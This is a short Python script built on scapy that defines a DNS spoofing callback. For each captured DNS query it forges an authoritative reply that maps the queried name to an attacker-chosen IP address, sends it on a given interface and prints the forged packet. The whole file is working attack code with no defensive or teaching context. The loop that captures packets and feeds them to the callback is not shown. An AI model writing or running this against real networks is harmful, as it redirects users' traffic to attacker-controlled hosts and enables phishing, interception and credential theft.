#!/usr/bin/python
from scapy.all import *
import sys


def dspoof(spoofIP, int1):

    def dospoof(pkt):

        d = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,
                                                                                                     qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata=str(spoofIP).strip()))

        send(d, iface=int1)

        d.show()

    return dospoof
